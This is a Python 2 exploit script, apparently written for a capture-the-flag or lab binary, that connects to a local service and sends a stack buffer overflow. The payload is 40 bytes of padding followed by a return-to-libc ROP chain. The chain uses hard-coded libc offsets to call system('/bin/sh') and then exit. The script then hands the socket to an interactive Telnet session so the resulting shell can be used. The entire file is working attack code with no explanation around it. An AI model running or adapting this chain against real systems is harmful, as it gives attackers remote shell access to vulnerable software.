from socket import *
from telnetlib import Telnet
from time import time, sleep
from sys import argv
from struct import pack, unpack

def read_until(s, c):
    ret = ""
    while 1:
        ret += s.recv(1)
        if ret.endswith(c):
            return ret

# 0x12345678 => \x78\x56\x34\x12 
def p(x):
    return pack("<Q", x)

# \x78\x56\x34\x12 => 0x12345678 => 305419896
def u(x):
    return unpack("<Q", x)[0]

def interact(s):
    print("[*] interactive mode")
    t = Telnet()
    t.sock = s
    t.interact()

if len(argv) >= 2 and argv[1] == "r":
    print("[*] connect to remote")
    # HOST =  
    # PORT = 

    
else:
    print("[*] connect to local")
    HOST = "localhost"
    PORT = 9999

    libc_addr = 0x7ffff79e4000
    system_off = 0x4f440
    system_addr = libc_addr + system_off
    binsh_off = 0x1b3e9a
    binsh_addr = libc_addr + binsh_off
    exit_off = 0x43120
    exit_addr = libc_addr + exit_off
    poprdi_off = 0x0002155f
    poprdi_addr = libc_addr + poprdi_off

    main_addr = 0x4005b7

def main():
    s = socket(AF_INET, SOCK_STREAM)
    s.connect((HOST, PORT))

    #_ = read_until(s, "hello\n")
    
    payload = "A" * 40
    payload += p(poprdi_addr)
    payload += p(binsh_addr)
    payload += p(system_addr)   
    #payload += (exit_addr)
    payload += p(poprdi_addr)
    payload += p(0)
    payload += p(exit_addr)
    payload += "A" * 8
    
    s.sendall(payload + "\n")
    
    sleep(1)
    interact(s)

    
if __name__ == "__main__":
    main()
